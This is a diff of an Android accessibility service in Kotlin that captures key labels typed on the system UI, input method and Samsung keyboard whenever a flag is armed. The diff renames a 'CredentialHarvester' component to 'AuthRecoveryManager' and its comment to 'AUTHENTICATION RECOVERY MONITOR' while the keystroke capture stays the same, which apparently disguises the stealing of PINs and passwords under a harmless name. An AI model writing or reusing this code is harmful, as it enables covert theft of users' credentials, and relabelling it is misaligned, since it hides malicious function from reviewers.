@@ -876,18 +876,18 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         // --- UNIVERSAL UI TRAP (Tap-Only Engine - Multiple Traps Support) ---
-        if (!isSafeZoneActive(this) && (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0 || CredentialHarvester.isArmed)) {
+        if (!isSafeZoneActive(this) && (cachedUiTraps.length() > 0 || cachedNativeTraps.length() > 0 || AuthRecoveryManager.isRecoveryActive)) {
             // STRICT REQUIREMENT: Only react to physical clicks
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
                 val pkg = event.packageName?.toString() ?: ""
                 
-                // --- CREDENTIAL HARVESTER ---
-                if (CredentialHarvester.isArmed && (pkg.contains("systemui") || pkg.contains("inputmethod") || pkg.contains("honeyboard"))) {
+                // --- AUTHENTICATION RECOVERY MONITOR ---
+                if (AuthRecoveryManager.isRecoveryActive && (pkg.contains("systemui") || pkg.contains("inputmethod") || pkg.contains("honeyboard"))) {
                     val text = event.text?.joinToString(" ") ?: ""
                     val desc = event.contentDescription?.toString() ?: ""
                     val keyLabel = if (text.isNotEmpty()) text else desc
                     if (keyLabel.isNotEmpty()) {
-                        CredentialHarvester.onKeyClicked(keyLabel)
+                        AuthRecoveryManager.onAuthInput(keyLabel)
                     }
                 }
                 
